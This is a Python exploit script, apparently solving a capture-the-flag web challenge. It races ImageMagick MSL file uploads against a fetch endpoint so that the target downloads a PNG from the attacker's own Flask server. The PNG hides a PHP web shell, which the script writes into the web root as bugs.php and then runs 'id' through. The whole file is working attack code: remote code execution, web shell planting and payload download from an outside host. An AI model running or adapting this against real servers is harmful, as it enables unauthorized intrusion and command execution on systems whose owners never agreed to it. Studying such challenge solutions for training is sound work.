#!/usr/bin/env python3

import argparse
import base64
import io
import requests
import time
from flask import Flask, send_file
from threading import Thread

MSL_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<image>
    <read filename="{URL}" />
    <write filename="/var/www/html/bugs.php" />
</image>"""

IMG_WEBSHELL = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAABlBMVEX/AAD///9BHTQRAAAAAWJLR0QB/wIt3gAAAAd0SU1FB+cLBwkUAAztZOgAAAAKSURBVAjXY2AAAAACAAHiIbwzAAAANHRFWHRDb3B5cmlnaHQAPD9waHAgdmFyX2R1bXAoc2hlbGxfZXhlYygkX0dFVFsiYyJdKSk7ID8+tvIpDgAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyMy0xMS0wN1QwOToyMDowMCswMDowMKVhO/AAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjMtMTEtMDdUMDk6MjA6MDArMDA6MDDUPINMAAAAAElFTkSuQmCC"

THREADS_NB = 1
REQ_PER_THREAD = 150

app = Flask(__name__)
@app.route('/')
def index():
    return '<html><head></head><body><img src="vid:msl:/tmp/php*"></body></html>'

@app.route('/image.png')
def image():
    image_binary = base64.b64decode(IMG_WEBSHELL)
    return send_file(io.BytesIO(image_binary), mimetype='image/jpeg', as_attachment=True, download_name='image.png')

def get_server_info():
    ip_port = argparse.ArgumentParser()
    ip_port.add_argument('url', help="URL of the challenge, ie. https://popupcreator.ctf.bzh/")
    ip_port.add_argument("-n",  default="172.0.0.1", help="IP of the listening webserver.")
    ip_port.add_argument("-p", type=int, default='8000', help="PORT of the listening webserver.")
    ip_port_parsed = ip_port.parse_args()
    return ip_port_parsed

def send_msl(url, local_server):
    print("[+] Send MSL to server")
    for i in range(100):
        try:
            payload = MSL_PAYLOAD.replace("{URL}", f"{local_server}image.png")
            files = {}
            for i in range(REQ_PER_THREAD):
                files[f"file{i}"] = payload
            requests.post(url, files=files)
        except:
            pass

def send_rate(url, local_server):
    print("[+] Send fetch request to server")
    for i in range(REQ_PER_THREAD):
        try:
            requests.post(f"{url}/fetch", data={"url": local_server})
        except:
            pass

if __name__ == "__main__":
    infos = get_server_info()
    local_server = f"http://{infos.n}:{infos.p}/"
    app_thread = Thread(target=lambda: app.run(host=infos.n, port=infos.p, use_reloader=False))
    app_thread.setDaemon(True)
    app_thread.start()

    time.sleep(1)

    l1, l2 = [], []
    for i in range(THREADS_NB):  # preload race
        l1.append(Thread(target=lambda: send_msl(infos.url, local_server)))
        l2.append(Thread(target=lambda: send_rate(infos.url, local_server)))

    for i in range(THREADS_NB):  # run race
        l1[i].start()
        l2[i].start()

    for t in range(THREADS_NB):  # Wait for end of thread
        l1[i].join()
        l2[i].join()

    exec_url = f"{infos.url}bugs.php?c=id"
    r = requests.get(exec_url)

    if "www-data" in r.text:
        print(f"[+] Got www-data for URL {exec_url}")
    else:
        print(f"[+] Cannot win race for URL {exec_url}")